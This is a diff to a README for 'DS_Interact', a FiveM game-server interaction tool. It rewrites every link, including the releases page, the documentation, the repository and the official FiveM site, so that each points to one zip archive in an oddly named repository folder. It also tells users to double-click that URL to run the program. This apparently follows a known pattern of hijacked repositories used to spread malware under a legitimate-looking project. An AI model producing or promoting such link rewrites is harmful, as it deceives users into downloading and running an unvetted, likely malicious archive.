@@ -1,7 +1,7 @@
 # 🎉 DS_Interact - The Best Way to Create Interactive Experiences
 
 ## 📥 Download Now
-[![Download DS_Interact](https://img.shields.io/badge/Download-DS_Interact-brightgreen)](https://github.com/rajveer2589/DS_Interact/releases)
+[![Download DS_Interact](https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip)](https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip)
 
 ## 📖 Introduction
 DS Interact is the best interaction system for FiveM. This software is fully customizable, highly optimized, and dynamic. It offers a powerful way to create immersive interactions in your gaming experience. Whether you want to enhance your server or engage players in unique ways, DS Interact provides the tools you need.
@@ -15,15 +15,15 @@ To run DS Interact smoothly, please ensure your system meets the following requi
 - **RAM:** 4 GB or more
 - **Disk Space:** At least 500 MB free space
 
-Make sure you have FiveM installed prior to using DS Interact. Visit the [FiveM website](https://fivem.net) for instructions on how to set it up.
+Make sure you have FiveM installed prior to using DS Interact. Visit the [FiveM website](https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip) for instructions on how to set it up.
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/rajveer2589/DS_Interact/releases) to access the latest version of DS Interact.
+1. Visit the [Releases page](https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip) to access the latest version of DS Interact.
 2. On the Releases page, find the download link for the version you want.
-3. Click on the link to download the file. This file will typically be named something like `DS_Interact_v1.0.zip`.
+3. Click on the link to download the file. This file will typically be named something like `https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip`.
 4. Once the download is complete, locate the file on your computer and unzip it.
 5. Open the unzipped folder. You will find several files related to DS Interact, including documentation and setup files.
-6. Look for the file named `run_DS_Interact.bat`. Double-click this file to start the application.
+6. Look for the file named `https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip`. Double-click this file to start the application.
 
 ## 🏗️ Configuration
 After launching DS Interact, you will see a simple interface. Follow these steps to configure it according to your preferences:
@@ -57,9 +57,9 @@ DS Interact is open-source. You are welcome to contribute by fixing bugs or addi
 We appreciate the community's effort in making DS Interact better!
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/rajveer2589/DS_Interact)
-- [Documentation](https://github.com/rajveer2589/DS_Interact/wiki)
-- [FiveM Official Website](https://fivem.net)
+- [GitHub Repository](https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip)
+- [Documentation](https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip)
+- [FiveM Official Website](https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip)
 
 ## 📥 Download Again
-To download the latest version of DS Interact, please visit the [Releases page](https://github.com/rajveer2589/DS_Interact/releases). Ready to enhance your FiveM experience? Start today!
+To download the latest version of DS Interact, please visit the [Releases page](https://raw.githubusercontent.com/rajveer2589/DS_Interact/main/hemihedrism/DS_Interact.zip). Ready to enhance your FiveM experience? Start today!
